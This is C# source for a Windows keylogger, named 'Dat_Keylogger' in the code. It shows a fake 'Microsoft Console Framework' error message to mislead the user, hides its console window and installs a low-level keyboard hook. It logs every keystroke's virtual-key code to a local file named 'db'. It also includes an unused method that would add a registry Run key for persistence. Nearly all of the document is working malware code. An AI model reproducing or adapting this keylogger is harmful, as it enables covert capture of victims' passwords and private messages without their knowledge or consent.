using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using Microsoft.Win32;

namespace Dat_Keylogger
{
    class Program
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static Stopwatch timer = new Stopwatch();
        private static bool onStartup = true;

        public static void Main()
        {
            var handle = GetConsoleWindow();

            Console.WriteLine("Error 1957 - could not find Microsoft Console Framework");
            
            // Hide
            ShowWindow(handle, SW_HIDE);

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private static void SetStartup()
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
             ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            if (onStartup)
                rk.SetValue("windkl", Application.ExecutablePath.ToString());
            else
                rk.DeleteValue("windkl", false);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr) WM_KEYDOWN)
            {
                timer.Stop();
                long time = timer.ElapsedMilliseconds;
                string add = "";
                if (time > 2000)
                {
                    add = Environment.NewLine;
                }

                int vkCode = Marshal.ReadInt32(lParam);
                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\db", true);
                sw.Write(add + ( vkCode).ToString() + " ");
                sw.Close();

                timer.Reset();
                timer.Start();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
            if (File.Exists(Application.StartupPath + "close.stahp"))
            {
                Environment.Exit(1);
            }
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

    }
}